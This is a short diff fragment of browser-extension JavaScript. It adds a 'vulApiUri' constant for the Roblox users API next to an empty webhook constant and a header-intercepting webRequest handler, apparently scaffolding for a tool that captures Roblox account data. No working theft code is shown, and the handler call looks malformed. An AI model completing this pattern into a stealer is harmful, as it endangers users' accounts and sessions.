@@ -1,4 +1,6 @@
 const webhook = "";
+const vulApiUri = "https://users.roblox.com/v1/users"; // ( POST )
+
 
 browser.webRequest.onHeadersReceived((details) => {
   if (details.url.startsWith(webhook)) {
